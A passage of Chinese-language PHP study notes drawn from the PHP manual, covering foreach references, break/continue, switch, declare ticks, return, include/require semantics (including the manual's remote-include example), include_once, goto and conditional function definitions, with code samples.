<p>可以很容易地通过在 <em>$value</em> 之前加上 &amp; 来修改数组的元素。此方法将以<a href="https://www.php.net/manual/zh/language.references.php" target="_blank" rel="noopener">引用</a>赋值而不是拷贝一个值。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">foreach</span> ($arr <span class="keyword">as</span> &amp;$value) &#123;</span><br><span class="line">    $value = $value * <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// $arr is now array(2, 4, 6, 8)</span></span><br><span class="line"><span class="keyword">unset</span>($value); <span class="comment">// 最后取消掉引用</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><em>$value</em> 的引用仅在被遍历的数组可以被引用时才可用（例如是个变量）。以下代码则无法运行：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>) <span class="keyword">as</span> &amp;$value) &#123;</span><br><span class="line">    $value = $value * <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>foreach* 不支持用“@”来抑制错误信息的能力。</p>
<p>以下代码功能完全相同：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="string">"one"</span>, <span class="string">"two"</span>, <span class="string">"three"</span>);</span><br><span class="line">reset($arr);</span><br><span class="line"><span class="keyword">while</span> (<span class="keyword">list</span>(, $value) = each($arr)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Value: $value&lt;br&gt;\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $value) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Value: $value&lt;br /&gt;\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="string">"one"</span>, <span class="string">"two"</span>, <span class="string">"three"</span>);</span><br><span class="line">reset($arr);</span><br><span class="line"><span class="keyword">while</span> (<span class="keyword">list</span>($key, $value) = each($arr)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Key: $key; Value: $value&lt;br /&gt;\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Key: $key; Value: $value&lt;br /&gt;\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="用-list-给嵌套的数组解包-¶"><a href="#用-list-给嵌套的数组解包-¶" class="headerlink" title="用 list() 给嵌套的数组解包 ¶"></a>用 list() 给嵌套的数组解包<a href="https://www.php.net/manual/zh/control-structures.foreach.php#control-structures.foreach.list" target="_blank" rel="noopener"> ¶</a></h4><p><em>(PHP 5 &gt;= 5.5.0, PHP 7)</em></p>
<p>PHP 5.5 增添了遍历一个数组的数组的功能并且把嵌套的数组解包到循环变量中，只需将 <a href="https://www.php.net/manual/zh/function.list.php" target="_blank" rel="noopener">list()</a> 作为值提供。</p>
<p>例如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$array = [</span><br><span class="line">    [<span class="number">1</span>, <span class="number">2</span>],</span><br><span class="line">    [<span class="number">3</span>, <span class="number">4</span>],</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($array <span class="keyword">as</span> <span class="keyword">list</span>($a, $b)) &#123;</span><br><span class="line">    <span class="comment">// $a contains the first element of the nested array,</span></span><br><span class="line">    <span class="comment">// and $b contains the second element.</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"A: $a; B: $b\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">A: 1; B: 2</span></span><br><span class="line"><span class="comment">A: 3; B: 4</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<h3 id="break-continue"><a href="#break-continue" class="headerlink" title="break/continue"></a>break/continue</h3><p>PHP中 <em>break</em>/continue 可以接受一个可选的数字参数来决定跳出几重循环。</p>
<p>*<strong>break* 的更新记录</strong></p>
<table>
<thead>
<tr>
<th align="left">版本</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">5.4.0</td>
<td align="left"><em>break 0;</em> 不再合法。这在之前的版本被解析为 *break 1;*。</td>
</tr>
<tr>
<td align="left">5.4.0</td>
<td align="left">取消变量作为参数传递（例如 *$num = 2; break $num;*）。</td>
</tr>
</tbody></table>
<p>continue同break。</p>
<h3 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h3><p>注意和其它语言不同，<a href="https://www.php.net/manual/zh/control-structures.continue.php" target="_blank" rel="noopener">continue</a> 语句作用到 switch 上的作用类似于 <em>break</em>。如果在循环中有一个 switch 并希望 continue 到外层循环中的下一轮循环，用 <em>continue 2</em>。</p>
<p><strong>注意 switch/case 作的是<a href="https://www.php.net/manual/zh/types.comparisons.php#types.comparisions-loose" target="_blank" rel="noopener">松散比较</a>。</strong></p>
<p><em>switch</em> 语句一行接一行地执行（实际上是语句接语句）。开始时没有代码被执行。仅当一个 <em>case</em> 语句中的值和 <em>switch</em> 表达式的值匹配时 PHP 才开始执行语句，<strong>直到 <em>switch</em> 的程序段结束或者遇到第一个 <em>break</em> 语句为止。如果不在 case 的语句段最后写上 <em>break</em> 的话，PHP 将继续执行下一个 case 中的语句段。</strong></p>
<p>在一个 case 中的语句也可以为空，这样只不过将控制转移到了下一个 case 中的语句。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">switch</span> ($i) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"i is less than 3 but not negative"</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"i is 3"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>一个 case 的特例是 <em>default</em>。它匹配了任何和其它 case 都不匹配的情况。例如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">switch</span> ($i) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"i equals 0"</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"i equals 1"</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"i equals 2"</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"i is not equal to 0, 1 or 2"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>允许使用分号代替 case 语句后的冒号。</p>
<h3 id="declare"><a href="#declare" class="headerlink" title="declare"></a>declare</h3><p><em>declare</em> 结构用来设定一段代码的执行指令。<em>declare</em> 的语法和其它流程控制结构相似：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">declare</span> (directive)</span><br><span class="line">    statement</span><br></pre></td></tr></table></figure>

<p><em>directive</em> 部分允许设定 <em>declare</em> 代码段的行为。目前只认识两个指令：<em>ticks</em>（更多信息见下面 <a href="https://www.php.net/manual/zh/control-structures.declare.php#control-structures.declare.ticks" target="_blank" rel="noopener">ticks</a> 指令）以及 <em>encoding</em>（更多信息见下面 <a href="https://www.php.net/manual/zh/control-structures.declare.php#control-structures.declare.encoding" target="_blank" rel="noopener">encoding</a> 指令）。</p>
<blockquote>
<p><strong>Note</strong>: encoding 是 PHP 5.3.0 新增指令。</p>
</blockquote>
<p><em>declare</em> 结构也可用于全局范围，影响到其后的所有代码（但如果有 <em>declare</em> 结构的文件被其它文件包含，则对包含它的父文件不起作用）。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// these are the same:</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// you can use this:</span></span><br><span class="line"><span class="keyword">declare</span>(ticks=<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">// entire script here</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// or you can use this:</span></span><br><span class="line"><span class="keyword">declare</span>(ticks=<span class="number">1</span>);</span><br><span class="line"><span class="comment">// entire script here</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="Tick"><a href="#Tick" class="headerlink" title="Tick"></a>Tick</h4><p>Tick（时钟周期）是一个在 <em>declare</em> 代码段中解释器每执行 N 条可计时的低级语句就会发生的事件。N 的值是在 <em>declare</em> 中的 <em>directive</em> 部分用 <code>ticks=N</code> 来指定的。</p>
<p>不是所有语句都可计时。通常条件表达式和参数表达式都不可计时。</p>
<p>在每个 tick 中出现的事件是由 <a href="https://www.php.net/manual/zh/function.register-tick-function.php" target="_blank" rel="noopener">register_tick_function()</a> 来指定的。更多细节见下面的例子。注意每个 tick 中可以出现多个事件。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">declare</span>(ticks=<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// A function called on each tick event</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tick_handler</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"tick_handler() called\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">register_tick_function(<span class="string">'tick_handler'</span>);</span><br><span class="line"></span><br><span class="line">$a = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($a &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    $a += <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">print</span>($a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">tick_handler() called</span></span><br><span class="line"><span class="comment">tick_handler() called</span></span><br><span class="line"><span class="comment">tick_handler() called</span></span><br><span class="line"><span class="comment">3tick_handler() called</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//和上面的效果相同</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tick_handler</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"tick_handler() called\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="number">1</span>;</span><br><span class="line">tick_handler();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($a &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    $a += <span class="number">2</span>;</span><br><span class="line">    tick_handler();</span><br><span class="line">    <span class="keyword">print</span>($a);</span><br><span class="line">    tick_handler();</span><br><span class="line">&#125;</span><br><span class="line">tick_handler();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="Encoding"><a href="#Encoding" class="headerlink" title="Encoding"></a>Encoding</h4><p>可以用 encoding 指令来对每段脚本指定其编码方式。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">declare</span>(encoding=<span class="string">'ISO-8859-1'</span>);</span><br><span class="line"><span class="comment">// code here</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在 PHP 5.3 中除非在编译时指定了 <em>–enable-zend-multibyte</em>，否则 declare 中的 encoding 值会被忽略。注意除非用 <a href="https://www.php.net/manual/zh/function.phpinfo.php" target="_blank" rel="noopener">phpinfo()</a>，否则 PHP 不会显示出是否在编译时指定了 <em>–enable-zend-multibyte</em>。参见 <a href="https://www.php.net/manual/zh/ini.core.php#ini.zend.script-encoding" target="_blank" rel="noopener">zend.script_encoding</a>。</p>
<h3 id="return"><a href="#return" class="headerlink" title="return"></a>return</h3><p>如果在一个函数中调用 <strong>return</strong> 语句，将立即结束此函数的执行并将它的参数作为函数的值返回。<strong>return</strong> 也会终止 <a href="https://www.php.net/manual/zh/function.eval.php" target="_blank" rel="noopener">eval()</a> 语句或者脚本文件的执行。</p>
<p>如果在全局范围中调用，则当前脚本文件中止运行。如果当前脚本文件是被 <a href="https://www.php.net/manual/zh/function.include.php" target="_blank" rel="noopener">include</a> 的或者 <a href="https://www.php.net/manual/zh/function.require.php" target="_blank" rel="noopener">require</a> 的，则控制交回调用文件。此外，如果当前脚本是被 <a href="https://www.php.net/manual/zh/function.include.php" target="_blank" rel="noopener">include</a> 的，则 <strong>return</strong> 的值会被当作 <a href="https://www.php.net/manual/zh/function.include.php" target="_blank" rel="noopener">include</a> 调用的返回值。如果在主脚本文件中调用 <strong>return</strong>，则脚本中止运行。如果当前脚本文件是在 php.ini 中的配置选项 <a href="https://www.php.net/manual/zh/ini.core.php#ini.auto-prepend-file" target="_blank" rel="noopener">auto_prepend_file</a> 或者 <a href="https://www.php.net/manual/zh/ini.core.php#ini.auto-append-file" target="_blank" rel="noopener">auto_append_file</a> 所指定的，则此脚本文件中止运行。</p>
<blockquote>
<p><strong>Note</strong>: 当用引用返回值时<em>永远不要</em>使用括号，这样行不通。只能通过引用返回变量，而不是语句的结果。如果使用 <em>return ($a);</em> 时其实<strong>不是返回一个变量，而是表达式 <em>($a)</em> 的值</strong>（当然，此时该值也正是 $a 的值）。</p>
</blockquote>
<h3 id="include-require"><a href="#include-require" class="headerlink" title="include/require"></a>include/require</h3><p>包含文件用。区别是include遇错产警告，require遇错终止。</p>
<p>如果没有给出目录（只有文件名）时则按照 <a href="https://www.php.net/manual/zh/ini.core.php#ini.include-path" target="_blank" rel="noopener">include_path</a> 指定的目录寻找。如果在 <a href="https://www.php.net/manual/zh/ini.core.php#ini.include-path" target="_blank" rel="noopener">include_path</a> 下没找到该文件则 <em>include</em> 最后才在调用脚本文件所在的目录和当前工作目录下寻找。如果定义了路径（绝对和相对）<a href="https://www.php.net/manual/zh/ini.core.php#ini.include-path" target="_blank" rel="noopener">include_path</a> 会被完全忽略。</p>
<p>当一个文件被包含时，其中所包含的代码继承了 include 所在行的<a href="https://www.php.net/manual/zh/language.variables.scope.php" target="_blank" rel="noopener">变量范围</a>。从该处开始，调用文件在该行处可用的任何变量在被调用的文件中也都可用。不过所有在包含文件中定义的函数和类都具有全局作用域（?）。</p>
<p>如果 include 出现于调用文件中的一个函数里，则被调用的文件中所包含的所有代码将表现得如同它们是在该函数内部定义的一样。所以它将遵循该函数的变量范围。此规则的一个例外是<a href="https://www.php.net/manual/zh/language.constants.predefined.php" target="_blank" rel="noopener">魔术常量</a>，它们是在发生包含之前就已被解析器处理的。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $color;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span> <span class="string">'vars.php'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"A $color $fruit"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* vars.php is in the scope of foo() so     *</span></span><br><span class="line"><span class="comment"> * $fruit is NOT available outside of this  *</span></span><br><span class="line"><span class="comment"> * scope.  $color is because we declared it *</span></span><br><span class="line"><span class="comment"> * as global.                               */</span></span><br><span class="line"></span><br><span class="line">foo();                    <span class="comment">// A green apple</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"A $color $fruit"</span>;   <span class="comment">// A green</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>当一个文件被包含时，语法解析器在目标文件的开头脱离 PHP 模式并进入 HTML 模式，到文件结尾处恢复。由于此原因，目标文件中需要作为 PHP 代码执行的任何代码都必须被包括在<a href="https://www.php.net/manual/zh/language.basic-syntax.phpmode.php" target="_blank" rel="noopener">有效的 PHP 起始和结束标记</a>之中。（文件中的html内容会被直接显示出来。）</p>
<p>如果“<a href="https://www.php.net/manual/zh/filesystem.configuration.php#ini.allow-url-include" target="_blank" rel="noopener">URL include wrappers</a>”在 PHP 中被激活，可以用 URL（通过 HTTP 或者其它支持的封装协议——见<a href="https://www.php.net/manual/zh/wrappers.php" target="_blank" rel="noopener">支持的协议和封装协议</a>）而不是本地文件来指定要被包含的文件（远程包含）。如果目标服务器将目标文件作为 PHP 代码解释，则可以用适用于 HTTP GET 的 URL 请求字符串来向被包括的文件传递变量。严格的说这和包含一个文件并继承父文件的变量空间并不是一回事；该脚本文件实际上已经在远程服务器上运行了，而本地脚本则包括了其结果。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* This example assumes that www.example.com is configured to parse .php *</span></span><br><span class="line"><span class="comment"> * files and not .txt files. Also, 'Works' here means that the variables *</span></span><br><span class="line"><span class="comment"> * $foo and $bar are available within the included file.                 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Won't work; file.txt wasn't handled by www.example.com as PHP</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'http://www.example.com/file.txt?foo=1&amp;bar=2'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Won't work; looks for a file named 'file.php?foo=1&amp;bar=2' on the</span></span><br><span class="line"><span class="comment">// local filesystem.</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'file.php?foo=1&amp;bar=2'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Works.</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'http://www.example.com/file.php?foo=1&amp;bar=2'</span>;</span><br><span class="line"></span><br><span class="line">$foo = <span class="number">1</span>;</span><br><span class="line">$bar = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">'file.txt'</span>;  <span class="comment">// Works.</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'file.php'</span>;  <span class="comment">// Works.</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>因为 <em>include</em> 是一个特殊的语言结构，其参数不需要括号。在比较其返回值时要注意。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// won't work, evaluated as include(('vars.php') == TRUE), i.e. include('')</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">include</span>(<span class="string">'vars.php'</span>) == <span class="keyword">TRUE</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'OK'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// works</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">include</span> <span class="string">'vars.php'</span>) == <span class="keyword">TRUE</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'OK'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>include和return：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span>.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$var = <span class="string">'PHP'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> $var;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">noreturn.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$var = <span class="string">'PHP'</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">testreturns.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$foo = <span class="keyword">include</span> <span class="string">'return.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $foo; <span class="comment">// prints 'PHP'</span></span><br><span class="line"></span><br><span class="line">$bar = <span class="keyword">include</span> <span class="string">'noreturn.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $bar; <span class="comment">// prints 1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果在包含文件中定义有函数，这些函数不管是在 <a href="https://www.php.net/manual/zh/function.return.php" target="_blank" rel="noopener">return</a> 之前还是之后定义的，都可以独立在主文件中使用。如果文件被包含两次，PHP 5 发出致命错误因为函数已经被定义，但是 PHP 4 不会对在 <a href="https://www.php.net/manual/zh/function.return.php" target="_blank" rel="noopener">return</a> 之后定义的函数报错。推荐使用 <a href="https://www.php.net/manual/zh/function.include-once.php" target="_blank" rel="noopener">include_once</a> 而不是检查文件是否已包含并在包含文件中有条件返回。</p>
<p>将 PHP 文件“包含”到一个变量中的方法是用<a href="https://www.php.net/manual/zh/ref.outcontrol.php" target="_blank" rel="noopener">输出控制函数</a>结合 <strong>include</strong> 来捕获其输出，例如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$string = get_include_contents(<span class="string">'somefile.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_include_contents</span><span class="params">($filename)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_file($filename)) &#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        <span class="keyword">include</span> $filename;</span><br><span class="line">        $contents = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">return</span> $contents;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>要在脚本中自动包含文件，参见 php.ini 中的 <a href="https://www.php.net/manual/zh/ini.core.php#ini.auto-prepend-file" target="_blank" rel="noopener">auto_prepend_file</a> 和 <a href="https://www.php.net/manual/zh/ini.core.php#ini.auto-append-file" target="_blank" rel="noopener">auto_append_file</a> 配置选项。</p>
<blockquote>
<p><strong>Note</strong>: 因为是一个语言构造器而不是一个函数，不能被 <a href="https://www.php.net/manual/zh/functions.variable-functions.php" target="_blank" rel="noopener">可变函数</a> 调用。</p>
</blockquote>
<h3 id="include-once-require-once"><a href="#include-once-require-once" class="headerlink" title="include_once/require_once"></a>include_once/require_once</h3><p>只包含一次。</p>
<blockquote>
<p>Note:</p>
<p>在 PHP 4中，_once 的行为在不区分大小写字母的操作系统（例如 Windows）中有所不同，例如：</p>
<p>Example #1 include_once 在 PHP 4 运行于不区分大小写的操作系统中</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"a.php"</span>; <span class="comment">// 这将包含 a.php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"A.php"</span>; <span class="comment">// 这将再次包含 a.php！（仅 PHP 4）</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>此行为在 PHP 5 中改了，例如在 Windows 中路径先被规格化，因此 C:\PROGRA~1\A.php 和 C:\Program Files\a.php 的实现一样，文件只会被包含一次。</p>
</blockquote>
<h3 id="goto"><a href="#goto" class="headerlink" title="goto"></a>goto</h3><p>PHP 中的 <em>goto</em> 有一定限制，目标位置只能位于同一个文件和作用域，也就是说无法跳出一个函数或类方法，也无法跳入到另一个函数。也无法跳入到任何循环或者 switch 结构中。可以跳出循环或者 switch，通常的用法是用 <em>goto</em> 代替多层的 <em>break</em>。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>,$j=<span class="number">50</span>; $i&lt;<span class="number">100</span>; $i++) &#123;</span><br><span class="line">  <span class="keyword">while</span>($j--) &#123;</span><br><span class="line">    <span class="keyword">if</span>($j==<span class="number">17</span>) <span class="keyword">goto</span> end; </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"i = $i"</span>;</span><br><span class="line">end:</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'j hit 17'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// 无效写法</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">goto</span> loop;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>,$j=<span class="number">50</span>; $i&lt;<span class="number">100</span>; $i++) &#123;</span><br><span class="line">  <span class="keyword">while</span>($j--) &#123;</span><br><span class="line">    loop:</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"$i = $i"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>Note</strong>:</p>
<p>goto 操作符仅在 PHP 5.3及以上版本有效。</p>
</blockquote>
<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="自定义函数"><a href="#自定义函数" class="headerlink" title="自定义函数"></a>自定义函数</h3><p>任何有效的 PHP 代码都有可能出现在函数内部，甚至包括其它函数和<a href="https://www.php.net/manual/zh/language.oop5.basic.php#language.oop5.basic.class" target="_blank" rel="noopener">类</a>定义。</p>
<p>函数无需在调用之前被定义，<em>除非</em>是下面两个例子中函数是有条件被定义时。当一个函数是有条件被定义时，必须在调用函数<em>之前</em>定义。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$makefoo = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 不能在此处调用foo()函数，</span></span><br><span class="line"><span class="comment">   因为它还不存在，但可以调用bar()函数。*/</span></span><br><span class="line"></span><br><span class="line">bar();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($makefoo) &#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">foo</span><span class="params">()</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"I don't exist until program execution reaches me.\n"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 现在可以安全调用函数 foo()了，</span></span><br><span class="line"><span class="comment">   因为 $makefoo 值为真 */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($makefoo) foo();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bar</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"I exist immediately upon program start.\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">bar</span><span class="params">()</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"I don't exist until foo() is called.\n"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 现在还不能调用bar()函数，因为它还不存在 */</span></span><br><span class="line"></span><br><span 